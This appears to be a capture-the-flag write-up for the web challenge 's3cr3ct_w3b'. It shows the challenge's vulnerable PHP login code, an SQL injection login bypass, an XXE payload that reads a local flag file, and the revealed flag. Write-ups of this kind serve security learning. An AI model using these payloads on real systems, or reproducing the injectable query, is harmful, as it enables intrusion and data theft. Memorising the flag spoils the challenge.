---
layout: post
title:  "s3cr3ct_w3b"
date:   2025-10-18 16:33:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /qnqsec-2025-s3cr3ct-w3b/
---

**Title:** s3cr3ct_w3b

**Category:** web

**Description:** I have hidden secret in this web can you find out the secret? `http://161.97.155.116:8081/`

**Author:** LemonTea

I get dockerfiles for local testing. From there I can see the flag will be at `/var/www/html/flag.txt`. 

When first visiting the site I see a login page. In `login.php` I see this:
```t
<?php  
session_start();  
  
$host = 'db';  
$db   = 'login_db';  
$user = 'root_users';  
$pass = 'root';    
$charset = 'utf8mb4';  
  
$dsn = "mysql:host=$host;dbname=$db;charset=$charset";  
$options = [  
   PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,  
   PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,  
];  
  
try {  
   $pdo = new PDO($dsn, $user, $pass, $options);  
} catch (PDOException $e) {  
   die("Database connection failed: " . $e->getMessage());  
}  
  
$user_data = null;  
$error = null;  
  
if (!empty($_POST['username']) && !empty($_POST['password'])) {  
   $username = $_POST['username'];  
   $password = $_POST['password'];  
  
   $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";  
  
   try {  
       $stmt = $pdo->query($query);  
       $user_data = $stmt->fetch();  
   } catch (PDOException $e) {  
       error_log("SQL Error: " . $e->getMessage());  
       $user_data = false;  
       $error = "Database error occurred";  
   }  
  
   if ($user_data) {  
       $_SESSION['logged_in'] = true;  
       $_SESSION['username'] = $user_data['username'];  
       $_SESSION['role'] = $user_data['role'] ?? 'user';  
       header('Location: index.php');  
       exit();  
   } else {  
       $error = $error ?? "Invalid username or password!";  
   }  
}  
?>
```
I login with the credentials: username: `admin`, and password: `' OR '1'='1`. 

The single line (`$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";`) building `$query` from raw `$_POST` variables is the root cause. There is no input sanitization for what the user supplies. 

The query starts as `SELECT * FROM users WHERE username = '$username' AND password = '$password'` so `SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'` works even if we have no password. `'1'='1'` always so we are logged in. 

Once I am authenticated I can upload and parse XML files on the page. I create an XML file that will retrieve the contents of the flag file:
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE root [  
 <!ENTITY flag SYSTEM "file:///var/www/html/flag.txt">  
]>  
<root>&flag;</root>
```

After uploading `xxe.xml` the page returns this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY flag SYSTEM "file:///var/www/html/flag.txt">
]>
<root>QnQSec{sql1+XXE_1ng3tion_but_using_php_filt3r}</root>
```

`QnQSec{sql1+XXE_1ng3tion_but_using_php_filt3r}`